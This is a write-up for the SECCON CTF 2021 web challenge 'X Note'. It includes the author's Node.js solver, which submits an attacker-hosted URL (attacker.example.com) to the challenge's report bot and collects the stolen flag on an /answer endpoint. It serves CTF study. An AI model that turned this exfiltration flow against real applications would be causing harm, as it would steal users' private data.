---
title: "X Note - SECCON CTF 2021"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "note", "web", "seccon-ctf-2021"]
summary: "Here is a secure note app!"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202112_SECCON_CTF_2021/web/x-note"
license: "none stated"
ctf:
  name: "SECCON CTF 2021"
  year: 2021
  challenge: "X Note"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202112_SECCON_CTF_2021/web/x-note>
- **CTF:** SECCON CTF 2021

---

# [web] x-note

## Description

Here is a secure note app!

- `http://x-note-x.quals.seccon.jp:3000`

Flag format: `SECCON{[_0-9a-z]+}`

## Attachments

- [dist](files/dist)

## Usage

Launch a challenge server:

```
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e SECCON_URL=http://localhost:3000 \
    -e ATTACK_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solver)
```

where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202112_SECCON_CTF_2021/web/x-note/solver/index.js>

```javascript
const fastify = require("fastify")();
const path = require("path");
const fetch = (...args) =>
  import("node-fetch").then(({ default: fetch }) => fetch(...args));

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_URL = process.env.SECCON_URL;
const ATTACK_URL = process.env.ATTACK_URL;

const autoReport = SECCON_URL != null || ATTACK_URL != null;
if (autoReport) {
  if (SECCON_URL == null) fail("SECCON_URL not found");
  if (ATTACK_URL == null) fail("ATTACK_URL not found");

  if (!ATTACK_URL.startsWith("http://")) {
    fail("The protocol of ATTACK_URL must be http, not https");
  }
}

fastify.register(require("fastify-static"), {
  root: path.join(__dirname, "public"),
  prefix: "/",
});

fastify.get("/answer", async (request, reply) => {
  const flag = request.query.flag;
  console.log(flag); // Got flag!
  reply.send(flag);
});

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const report = async () => {
  const maxIter = 5;

  let iter = 0;
  while (iter++ < maxIter) {
    await sleep(5000);

    try {
      const pingRes = await fetch(ATTACK_URL);
      if (pingRes.status !== 200) {
        throw new Error(`status code for ${ATTACK_URL}: ${pingRes.status}`);
      }

      const url = `${SECCON_URL}/report`;
      const body = new URLSearchParams();
      body.append("url", ATTACK_URL);
      const reportRes = await fetch(url, {
        method: "POST",
        body,
      });
      if (reportRes.status !== 200) {
        throw new Error(`status code for ${url}: ${reportRes.status}`);
      }

      const text = await reportRes.text();
      console.log(text);
      break;
    } catch (e) {
      console.log(e);
    }
  }

  if (iter === maxIter) {
    fail("Failed to exploit");
  }
};

const start = async () => {
  try {
    const port = 8080;
    await fastify.listen(port, "0.0.0.0").then(async () => {
      console.log(`Listening at ${port}`);
      if (autoReport) {
        await report();
        await sleep(120 * 1000);
        process.exit(0);
      }
    });
  } catch (err) {
    fastify.log.error(err);
    process.exit(1);
  }
};
start();
```
